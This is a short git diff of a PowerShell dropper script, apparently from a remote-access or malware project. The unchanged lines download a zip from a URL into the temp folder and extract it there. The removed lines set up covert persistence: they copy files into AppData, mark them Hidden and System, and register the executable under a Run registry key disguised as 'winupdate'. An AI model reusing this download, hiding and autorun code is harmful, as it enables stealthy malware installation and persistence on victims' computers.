@@ -10,6 +10,7 @@ $TEMP = "$env:TEMP"
 # download zip file
 (New-Object System.Net.WebClient).DownloadFile($url, "$TEMP\$ZipName")
 
+
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
 # function to unzip zip file
@@ -25,15 +26,6 @@ Unzip "$TEMP\$ZipName" "$TEMP"
 Set-Location -Path "$TEMP"
 
 # --------------------- rest of code is referenced from persistence.ps1 ---------------------
-$APPDATA = "$env:APPDATA"
-Copy-Item -Path $strFileDir -Destination $APPDATA -Recurse -Force
-$(Get-Item $APPDATA\$strFileDir).Attributes = ‘Hidden, System’
-Get-ChildItem -Filter *.exe $APPDATA\$strFileDir | ForEach {
-    If (Compare-Object $_.Name "w9xpopen.exe") {
-    $strFilePath = $_.FullName
-}
-}
-New-ItemProperty -path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -name winupdate -PropertyType String -value "$strFilePath" -Force
 $strScriptPath = $MyInvocation.MyCommand.Path; $strDirScriptPath = Split-Path $strScriptPath
 Set-Location -Path $strDirScriptPath
 $WINDIR = "$env:WINDIR"
